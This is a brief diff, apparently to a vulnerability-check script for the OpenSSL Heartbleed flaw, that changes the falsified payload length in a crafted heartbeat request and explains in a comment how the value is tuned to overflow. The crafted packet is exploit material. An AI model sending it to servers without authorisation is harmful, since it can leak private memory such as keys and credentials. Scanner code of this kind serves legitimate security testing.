@@ -164,7 +164,8 @@ OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1
         "03 02", -- TLSv1.1
         "00 03", -- record length
         "01", -- HeartbeatType HeartbeatRequest
-        "40 00", -- payload length (falsified)
+        "0f e9", -- payload length (falsified)
+        -- payload length is based on 4096 - 16 bytes padding - 8 bytes packet header + 1 to overflow
       })
     )
 
